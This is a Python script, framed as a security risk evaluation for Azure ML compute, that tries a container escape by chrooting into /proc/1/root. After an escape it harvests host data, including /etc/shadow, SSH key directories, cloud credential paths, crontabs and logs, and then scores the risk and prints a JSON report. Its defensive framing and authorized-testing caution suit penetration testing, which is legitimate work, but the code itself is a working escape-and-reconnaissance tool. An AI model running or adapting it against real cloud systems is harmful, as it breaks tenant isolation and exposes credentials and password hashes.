#!/usr/bin/env python3
"""
Extended Security Risk Evaluation for Azure ML Compute
--------------------------------------------------------
This script runs entirely non-interactively (suitable for serverless Azure ML jobs)
and performs the following steps:
  1. Collects extensive reconnaissance data from inside the container.
  2. Attempts to escape the container via chrooting into /proc/1/root.
  3. If escape is successful, collects the same data from the host.
  4. Compares key differences to validate host escape.
  5. Computes a risk score and outputs a comprehensive JSON report.

CAUTION: Use only in authorized testing environments.
"""

import os
import subprocess
import sys
import json
import socket
from datetime import datetime
from glob import glob

def run_command(command, timeout=10):
    """Execute a shell command and return its output."""
    try:
        result = subprocess.run(
            command, shell=True, check=False,
            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            text=True, timeout=timeout
        )
        return result.stdout.strip()
    except subprocess.TimeoutExpired:
        return "Command timed out"
    except Exception as e:
        return f"Error: {str(e)}"

def check_escape_capabilities():
    """Check if the container has the necessary privileges for escape."""
    capabilities = {
        "proc_1_root_access": os.access("/proc/1/root", os.R_OK),
        "cap_sys_admin": "cap_sys_admin" in run_command("capsh --print").lower(),
        "is_root": (os.geteuid() == 0)
    }
    print("[*] Escape Capability Check:")
    for k, v in capabilities.items():
        print(f"    {k}: {v}")
    return capabilities

def attempt_escape():
    """
    Attempt to escape the container by chrooting into /proc/1/root.
    Returns True if the escape is successful.
    """
    caps = check_escape_capabilities()
    if not (caps["proc_1_root_access"] and caps["cap_sys_admin"] and caps["is_root"]):
        print("[-] Required privileges or access not available for escape.")
        return False

    host_path = "/proc/1/root"
    test_file = os.path.join(host_path, "etc", "os-release")
    if not (os.path.exists(test_file) and os.access(test_file, os.R_OK)):
        print("[-] Cannot access key host file (etc/os-release). Escape aborted.")
        return False

    try:
        print("[*] Attempting chroot escape using /proc/1/root...")
        os.chroot(host_path)
        os.chdir("/")
        print("[+] chroot successful! Now operating in the host filesystem context.")
        return True
    except Exception as e:
        print(f"[-] chroot escape failed: {e}")
        return False

def enumerate_system_info():
    """Collect basic system information."""
    info = {
        "Kernel & OS Info": run_command("uname -a"),
        "OS Release": run_command("cat /etc/os-release"),
        "Hostname": run_command("cat /etc/hostname"),
        "System Uptime": run_command("cat /proc/uptime")
    }
    return info

def enumerate_mounts():
    """Retrieve mounted filesystem details."""
    return run_command("cat /proc/mounts")

def enumerate_sensitive_files():
    """Attempt to read sensitive files."""
    files_to_check = ["/etc/passwd", "/etc/shadow", "/etc/hosts"]
    sensitive = {}
    for file_path in files_to_check:
        try:
            if os.path.exists(file_path) and os.access(file_path, os.R_OK):
                with open(file_path, "r") as f:
                    sensitive[file_path] = f.read()
            else:
                sensitive[file_path] = "Not accessible"
        except Exception as e:
            sensitive[file_path] = f"Error: {e}"
    return sensitive

def enumerate_network():
    """Collect active network connection information."""
    if run_command("which ss"):
        return run_command("ss -tulnp")
    else:
        return run_command("netstat -tulnp")

def enumerate_processes():
    """List running processes."""
    return run_command("ps aux")

def enumerate_logs():
    """Read portions of common log files (limited output)."""
    log_files = ["/var/log/auth.log", "/var/log/syslog", "/var/log/messages"]
    logs = {}
    for log_file in log_files:
        if os.path.exists(log_file) and os.access(log_file, os.R_OK):
            try:
                with open(log_file, "r") as f:
                    logs[log_file] = f.read(1024)  # 1KB limit per file
            except Exception as e:
                logs[log_file] = f"Error: {e}"
        else:
            logs[log_file] = "Not accessible"
    return logs

def enumerate_docker():
    """Gather Docker container details if available."""
    docker_info = {}
    if run_command("which docker"):
        docker_info["docker_ps"] = run_command("docker ps -a")
    else:
        docker_info["docker_ps"] = "Docker not installed or not in PATH"
    return docker_info

def enumerate_kubernetes():
    """Enumerate Kubernetes configuration files, if present."""
    if os.path.isdir("/etc/kubernetes"):
        return {"kube_configs": run_command("find /etc/kubernetes -type f")}
    else:
        return {"kube_configs": "Kubernetes configuration directory not found"}

def enumerate_cloud_metadata():
    """Check for cloud configuration files."""
    cloud = {}
    # Azure checks
    cloud["waagent"] = run_command("find /var/lib/waagent -type f") if os.path.isdir("/var/lib/waagent") else "Not found"
    cloud["azure_config"] = run_command("find /etc/azure -type f") if os.path.isdir("/etc/azure") else "Not found"
    # AWS checks
    aws = {}
    aws_path = "/root/.aws"
    aws["root_aws"] = run_command(f"find {aws_path} -type f") if os.path.isdir(aws_path) else "Not found"
    cloud["aws"] = aws
    return cloud

def enumerate_sensitive_dirs():
    """Enumerate additional sensitive directories that could hold credentials or keys."""
    sensitive_dirs = {}
    # Check for SSH keys in /root and /home/*
    ssh_paths = ["/root/.ssh", "/home/*/.ssh"]
    for path in ssh_paths:
        files = []
        for f in glob(path):
            try:
                file_list = os.listdir(f)
                files.append({f: file_list})
            except Exception as e:
                files.append({f: f"Error: {e}"})
        sensitive_dirs[path] = files if files else "Not found"
    # Check for package listing (dpkg -l on Debian/Ubuntu)
    pkg_list = run_command("dpkg -l") if run_command("which dpkg") else "Not available"
    sensitive_dirs["package_list"] = pkg_list
    # Check for crontab files
    crontabs = {}
    for f in ["/etc/crontab", "/var/spool/cron/crontabs"]:
        if os.path.exists(f) and os.access(f, os.R_OK):
            try:
                with open(f, "r") as file:
                    crontabs[f] = file.read()
            except Exception as e:
                crontabs[f] = f"Error: {e}"
        else:
            crontabs[f] = "Not accessible"
    sensitive_dirs["crontabs"] = crontabs
    return sensitive_dirs

def gather_all_recon():
    """Aggregate all reconnaissance data."""
    data = {
        "host_info": enumerate_system_info(),
        "mounts": enumerate_mounts(),
        "sensitive_files": enumerate_sensitive_files(),
        "network": enumerate_network(),
        "processes": enumerate_processes(),
        "logs": enumerate_logs(),
        "docker": enumerate_docker(),
        "kubernetes": enumerate_kubernetes(),
        "cloud": enumerate_cloud_metadata(),
        "sensitive_dirs": enumerate_sensitive_dirs()
    }
    return data

def compare_recon(container_data, host_data):
    """
    Compare selected keys between container and host recon data.
    Returns a dictionary of differences.
    """
    diff = {}
    keys = ["mounts", "sensitive_files", "sensitive_dirs", "docker", "kubernetes", "cloud"]
    for key in keys:
        diff[key] = {
            "container": container_data.get(key),
            "host": host_data.get(key)
        }
    return diff

def compute_risk_score(container_data, host_data, escape_success):
    """
    Compute a risk score based on:
      - Whether host escape was achieved.
      - Accessibility of sensitive files (e.g., /etc/shadow).
      - Differences in mount points.
      - Exposure of additional sensitive directories.
      - Presence of cloud and Docker configuration details.
    Returns (score, risk_level).
    """
    score = 0

    if escape_success:
        score += 5

    shadow_content = host_data.get("sensitive_files", {}).get("/etc/shadow", "Not accessible")
    if "Not accessible" not in shadow_content and "Error" not in shadow_content:
        score += 5

    if container_data.get("mounts") != host_data.get("mounts"):
        score += 3

    sensitive_dirs = host_data.get("sensitive_dirs", {})
    if any("Not found" not in str(v) and "Error" not in str(v) for v in sensitive_dirs.values()):
        score += 2

    if host_data.get("cloud", {}).get("azure_config", "Not found") != "Not found":
        score += 2

    docker_info = host_data.get("docker", {}).get("docker_ps", "")
    if docker_info and "not in PATH" not in docker_info.lower():
        score += 2

    if score >= 10:
        level = "High"
    elif score >= 5:
        level = "Medium"
    else:
        level = "Low"

    return score, level

def main():
    start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    report = {
        "timestamp": start_time,
        "hostname": socket.gethostname(),
        "escape_capabilities": check_escape_capabilities(),
        "escape_success": False,
        "container_recon": {},
        "host_recon": {},
        "comparison": {},
        "risk_assessment": {}
    }

    print("==== Comprehensive Security Risk Evaluation ====")
    print(f"Started at: {start_time}")
    print("CAUTION: This script is for authorized testing only.\n")

    # Gather recon data from inside the container.
    print("[+] Gathering reconnaissance data from inside the container...")
    container_data = gather_all_recon()
    report["container_recon"] = container_data

    # Attempt to escape the container.
    print("\n[+] Attempting container escape via chroot...")
    escape_success = attempt_escape()
    report["escape_success"] = escape_success

    host_data = {}
    if escape_success:
        print("\n[+] Gathering reconnaissance data from the host (post-escape)...")
        host_data = gather_all_recon()
        report["host_recon"] = host_data
    else:
        print("[-] Container escape failed; host reconnaissance not performed.")

    # Compare key recon data.
    report["comparison"] = compare_recon(container_data, host_data)

    # Compute risk score.
    score, level = compute_risk_score(container_data, host_data, escape_success)
    report["risk_assessment"] = {
        "risk_score": score,
        "risk_level": level,
        "recommendations": (
            "High risk: Immediate review of container privileges and isolation is required. "
            "Drop CAP_SYS_ADMIN, restrict host mount exposure, and apply strict seccomp/AppArmor/SELinux policies."
            if level == "High" else
            "Medium risk: Review container runtime configurations and improve isolation boundaries."
            if level == "Medium" else
            "Low risk: The current posture appears acceptable, but continuous monitoring is recommended."
        )
    }

    # Output the final report.
    final_report = json.dumps(report, indent=2)
    print("\n===== FINAL SECURITY REPORT =====")
    print(final_report)

    # Optionally write the report to a file.
    try:
        with open("security_report.json", "w") as f:
            f.write(final_report)
        print("\n[+] Report written to security_report.json")
    except Exception as e:
        print(f"[-] Failed to write report to file: {e}")

if __name__ == "__main__":
    main()
